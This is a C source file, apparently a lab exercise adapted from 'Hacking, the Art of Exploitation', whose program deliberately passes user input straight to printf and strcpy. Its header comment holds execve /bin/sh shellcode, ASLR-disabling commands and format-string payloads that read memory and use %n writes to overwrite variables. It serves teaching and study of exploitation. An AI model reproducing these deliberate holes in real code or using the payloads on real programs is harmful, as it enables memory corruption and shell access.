/**
 * Adapted from Hacking, the Art of Exploitation by Jon Erickson
 *
 * Build:
 * clang exploitable.c -Wno-format-security -o exploitable
 *
 * Add shellcode to environment:
 * export SHELLCODE=$(printf "\xeb\x17\x5f\x48\x31\xd2\x48\x31\xc0\x48\x89\xe6\x48\x89\x54\x24\x08\x48\x89\x3c\x24\xb0\x3b\x0f\x05\xe8\xe4\xff\xff\xff/bin/sh")
 *
 * Turn off ASLR for a specific run
 * setarch `uname -m` -R <command>
 *
 * Find address:
 * setarch `uname -m` -R ./getenvaddr SHELLCODE ./exploitable
 * setarch `uname -m` -R ./getenvaddr PATH ./exploitable
 *
 * Print environment variable (find address with the command above):
 * setarch `uname -m` -R ./exploitable ..%13\$s.$(printf "\x2c\xe9\xff\xff\xff\x7f")
 *
 * Write to test_ptr:
 * setarch `uname -m` -R ./exploitable %6295612x....%2\$n..%p..%p..%p..%p.$(printf "\x50\x10\x60")
 *
 * Write to test_val:
 * setarch `uname -m` -R ./exploitable %6295612x....%2\$n..%p..%p..%p..%p.$(printf "\x40\x10\x60")
 *
 * Random Notes:
 * setarch `uname -m` -R ./getenvaddr PATH
 * setarch `uname -m` -R ./exploitable AAAAAAAA..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%sAAAA$(printf "\x52\xee\xff\xff\xff\x7f")
 * setarch `uname -m` -R ./exploitable AAAAAAAA..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%nAAAA$(printf "\x40\x10\x60")
 * setarch `uname -m` -R ./exploitable AAAAAAAA..%14\$s.$(printf "\x52\xee\xff\xff\xff\x7f")
 * setarch `uname -m` -R ./exploitable ..%13\$s.$(printf "\x52\xee\xff\xff\xff\x7f")
 * setarch `uname -m` -R ./exploitable %96x....%2\$n..%p..%p..%p..%p.$(printf "\x40\x10\x60")
 *
 * setarch `uname -m` -R ./exploitable ..%13\$s.$(printf "\xd2\xe8\xff\xff\xff\x7f")
 *
 * setarch `uname -m` -R ./exploitable AAAAAAAA..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%s$(printf "\x52\xee\xff\xff\xff\x7f")
 * setarch `uname -m` -R ./exploitable %p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.AAAAA%p.%p.%s.AAAAAAAAA$(printf "\x52\xee\xff\xff\xff\x7f")
 * setarch `uname -m` -R ./exploitable %p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%pAAAAAA%p.%p.%nAAAAAAAAAA$(printf "\x40\x10\x60")
 *
 * $ objdump -d -j .plt ./exploitable | grep exit
 * 0000000000400460 <exit@plt>:
 * 400460:	ff 25 c2 0b 20 00    	jmpq   *0x200bc2(%rip)        # 601028 <exit@GLIBC_2.2.5>
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <inttypes.h>

void exploited(void) {
  printf("EXPLOITED\n");
}

int main(int argc, char * argv[]) {
  char text[1024];
  static int test_val = -72;
  static void * test_ptr = 0;

  if (argc < 2) {
    printf("Usage: %s <text to print>\n", argv[0]);
    exit(0);
  }

  strcpy(text, argv[1]);

  printf(text);
  printf("\n");

  printf("pointer 0x%016" PRIxPTR " \t decimal value %d \t hex value 0x%08x\n", (uintptr_t) &test_val, test_val, test_val);
  printf("pointer 0x%016" PRIxPTR " \t pointer %p \t hex value 0x%016" PRIxPTR "\n", (uintptr_t) &test_ptr, test_ptr, (uintptr_t) test_ptr);

  exit(0);
}